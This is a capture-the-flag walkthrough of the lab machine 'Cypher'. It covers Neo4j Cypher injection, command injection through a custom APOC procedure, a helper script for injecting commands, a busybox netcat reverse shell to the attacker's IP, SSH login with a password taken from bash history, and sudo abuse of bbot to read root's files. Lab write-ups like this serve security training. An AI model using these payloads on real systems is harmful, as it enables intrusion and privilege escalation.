# ⚛️ Cypher CTF - Walkthrough

## 🔍 Initial Reconnaissance

I began by running an `nmap` scan on the target machine to identify open ports and services:

```bash
nmap -sC -sV -A 10.10.11.57
```

The scan revealed two open ports:

-   **🛡️ Port 22** → SSH (OpenSSH 9.6p1 Ubuntu)
-   **🌐 Port 80** → HTTP (nginx 1.24.0 Ubuntu)

I added `cypher.htb` to `/etc/hosts` and navigated to the website.

## 🌐 Website Analysis & Cypher Injection

The website on port 80 presented a login form. Attempting a basic SQL Injection revealed a detailed error message, indicating the backend uses **Neo4j** and **Cypher Query Language**. The error message specifically complained about "an even number of non-escaped quotes" and showed the injected query:

```cypher
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = '' or 1 = 1 --' return h.value as hash"
```

This confirmed a Cypher Injection vulnerability.

I used `gobuster` to enumerate directories and files:

```bash
gobuster dir -u cypher.htb -w ../../wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,html,txt,js
```

Key findings included `/about`, `/index`, `/login`, `/api` (redirecting to `/api/docs`), and `/testing`.

Navigating to `/testing` revealed an APOC (Awesome Procedures On Cypher) endpoint, which provides additional procedures for Neo4j.

### APOC Vulnerability (CVE-2022-36357)

I identified that the `APOC` version might be vulnerable. Further investigation into the custom APOC extension (`custom-apoc-extension-1.0-SNAPSHOT.jar`) via decompilation showed a custom procedure:

```java
public class CustomFunctions {
   @Procedure(name = "custom.getUrlStatusCode", mode = Mode.READ)
   public Stream<CustomFunctions.StringOutput> getUrlStatusCode(@Name("url") String url) throws Exception {
      // ... (URL validation) ...
      String[] command = new String[]{"/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url};
      Process process = Runtime.getRuntime().exec(command);
      // ...
   }
   // ...
}
```

This code snippet indicated that the `custom.getUrlStatusCode` procedure executed a `curl` command where the provided URL was directly concatenated into a shell command. This is a classic **Command Injection** vulnerability.
More information: [CVE-2022-36357 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2022-36357) (While this CVE is for APOC, the specific exploit here is due to the custom function rather than the core APOC vulnerabilities mentioned in the CVE, but it highlights the general risk with unvalidated inputs in custom procedures.)

I confirmed the command injection by executing `id`:

```bash
curl -X GET "http://cypher.htb/api/cypher?query=CALL%20custom.getUrlStatusCode(%22http://google.com;%20id%22)"
```

The response included `uid=110(neo4j) gid=111(neo4j) groups=111(neo4j)`, confirming successful command execution as the `neo4j` user.

### Remote Command Execution & Reverse Shell

I created a simple script (`getshell.sh`) to streamline command execution:

```bash
#!/bin/bash
if [ $# -eq 0 ]; then echo "Usage: $0 '<cypher_query>'"; exit 1; fi
encoded_query=$(echo "CALL custom.getUrlStatusCode(\"google.com; $1\")" | jq -sRr @uri)
response=$(curl -s "http://cypher.htb/api/cypher?query=${encoded_query}")
echo "$response" | jq -r '.[0].statusCode' | sed 's/^000//'
```

I then used this script to get a reverse shell. First, I set up a `netcat` listener on my attacking machine:

```bash
nc -lnvp 4444
```

Then, I executed the reverse shell payload through the `getshell.sh` script:

```bash
./getshell.sh "busybox nc MyIP 4444 -e sh"
```

✅ My `netcat` listener caught a connection, granting me a shell as the `neo4j` user.

## ➡️ Lateral Movement to Graphasm

While examining the `neo4j` user's `.bash_history`, I found a command that revealed a password:

```
neo4j-admin dbms set-initial-password cU4btyib.20xtCMCXkBmerhK
```

The password for the `neo4j` user was `cU4btyib.20xtCMCXkBmerhK`.

I identified the only other standard user on the system as `graphasm`. I attempted to log in via SSH using `graphasm` and this password:

```bash
ssh graphasm@cypher.htb
```

✅ The login was successful, providing me with a shell as `graphasm`. I retrieved the **user flag**.

## ⬆️ Privilege Escalation to Root

I checked `graphasm`'s `sudo` privileges:

```bash
sudo -l
```

This revealed that `graphasm` could run `/usr/local/bin/bbot` without a password:

```
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

`bbot` is an OSINT tool. Checking its documentation, I discovered that it has a feature to read targets from a file. This meant I could use `sudo bbot -t /root/root.txt` to read the root flag.

```bash
sudo /usr/local/bin/bbot -t /root/root.txt
```

The output of `bbot` included the content of `/root/root.txt` (hidden here for obvious reasons).

✅ I successfully read the **root flag** and gained root access.

## 🎯 Conclusion

The **Cypher** machine was successfully completed! 🧩

-   Initial access obtained through a Cypher Query Language (Neo4j) injection via a custom APOC procedure, leading to command execution as `neo4j`.
-   Lateral movement to `graphasm` by discovering the `neo4j` password in `.bash_history` and using it for SSH login.
-   Privilege escalation to `root` by exploiting `sudo` permissions on the `bbot` tool to read arbitrary files as root.
-   User and root flags acquired! 🏁

---